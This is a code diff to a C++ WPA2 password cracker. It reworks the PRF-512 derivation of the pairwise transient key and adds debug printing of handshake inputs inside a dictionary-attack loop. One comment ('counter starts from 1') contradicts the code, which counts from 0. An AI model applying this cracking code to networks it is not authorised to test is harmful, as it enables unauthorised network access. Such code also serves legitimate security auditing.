@@ -25,45 +25,62 @@ void WPA2Cracker::pbkdf2_sha1(const std::string& password, const std::string& ss
                       4096, EVP_sha1(), 32, output);
 }
 
-void WPA2Cracker::generate_ptk(const uint8_t* pmk, const uint8_t* anonce, 
+void WPA2Cracker::generate_ptk(const uint8_t* pmk, const uint8_t* anonce,
                                const uint8_t* snonce, const uint8_t* ap_mac,
                                const uint8_t* client_mac, uint8_t* ptk) {
+    // PRF-512 input format: A + 0x00 + B + counter
+    // A = "Pairwise key expansion" (22 bytes, no null)
+    // 0x00 = separator byte
+    // B = Min(MAC_AP, MAC_STA) || Max(MAC_AP, MAC_STA) || Min(ANonce, SNonce) || Max(ANonce, SNonce)
+    // counter = iteration number (0, 1, 2, 3)
+
     uint8_t data[100];
-    
-    // "Pairwise key expansion" (22 bytes) + null byte
-    memcpy(data, "Pairwise key expansion", 23); // Includes null terminator
-    
-    // Min/Max MAC addresses
+    int offset = 0;
+
+    // A: "Pairwise key expansion" (22 bytes, WITHOUT null terminator)
+    memcpy(data + offset, "Pairwise key expansion", 22);
+    offset += 22;
+
+    // Separator byte 0x00
+    data[offset] = 0x00;
+    offset += 1;
+
+    // B: Min/Max MAC addresses (12 bytes total)
     if (memcmp(ap_mac, client_mac, 6) < 0) {
-        memcpy(data + 23, ap_mac, 6);
-        memcpy(data + 29, client_mac, 6);
+        memcpy(data + offset, ap_mac, 6);
+        memcpy(data + offset + 6, client_mac, 6);
     } else {
-        memcpy(data + 23, client_mac, 6);
-        memcpy(data + 29, ap_mac, 6);
+        memcpy(data + offset, client_mac, 6);
+        memcpy(data + offset + 6, ap_mac, 6);
     }
-    
-    // Min/Max nonces
+    offset += 12;
+
+    // B: Min/Max nonces (64 bytes total)
     if (memcmp(anonce, snonce, 32) < 0) {
-        memcpy(data + 35, anonce, 32);
-        memcpy(data + 67, snonce, 32);
+        memcpy(data + offset, anonce, 32);
+        memcpy(data + offset + 32, snonce, 32);
     } else {
-        memcpy(data + 35, snonce, 32);
-        memcpy(data + 67, anonce, 32);
+        memcpy(data + offset, snonce, 32);
+        memcpy(data + offset + 32, anonce, 32);
     }
-    
+    offset += 64;
+
+    // Total so far: 22 + 1 + 12 + 64 = 99 bytes
+    // We'll add the counter byte (0-3) in the loop to make 100 bytes
+
     // PRF-512: Generate 64 bytes of PTK using HMAC-SHA1
     // HMAC-SHA1 gives 20 bytes per iteration, we need 64 bytes total
-    // So we do 4 iterations but only use first 64 bytes (discard last 16)
-    uint8_t ptk_temp[80]; // Temporary buffer for full 4 iterations
+    // 4 iterations × 20 bytes = 80 bytes (use first 64)
+    uint8_t ptk_temp[80];
     for (int i = 0; i < 4; i++) {
-        uint8_t temp[100];
-        memcpy(temp, data, 99);
-        temp[99] = i;
-        
+        // Append counter byte to create 100-byte input
+        data[99] = (uint8_t)i; // counter starts from 1
+
         unsigned int len;
-        HMAC(EVP_sha1(), pmk, 32, temp, 100, ptk_temp + (i * 20), &len);
+        HMAC(EVP_sha1(), pmk, 32, data, 100, ptk_temp + (i * 20), &len);
     }
-    // Copy only first 64 bytes to PTK
+
+    // Copy only first 64 bytes to PTK (KCK + KEK + TK)
     memcpy(ptk, ptk_temp, 64);
 }
 
@@ -160,6 +177,17 @@ std::string WPA2Cracker::crack(const WiFiNetwork& net, const std::string& dict_f
         uint8_t pmk[32];
         pbkdf2_sha1(password, net.ssid, pmk);
         
+
+        // DEBUG: show PTK inputs (print once or a few times)
+        if (attempts <= 5 || password == "12345678") {
+            std::cout << "[DEBUG] PTK inputs: AP=" << mac_to_string(net.ap_mac)
+                      << " (net.bssid=" << mac_to_string(net.bssid) << ")"
+                      << " client=" << mac_to_string(net.client_mac)
+                      << " ssid=\"" << net.ssid << "\""
+                      << " testing=\"" << password << "\""
+                      << "\n";
+        }
+
         // Generate PTK
         uint8_t ptk[64];
         generate_ptk(pmk, net.anonce, net.snonce, net.ap_mac, net.client_mac, ptk);
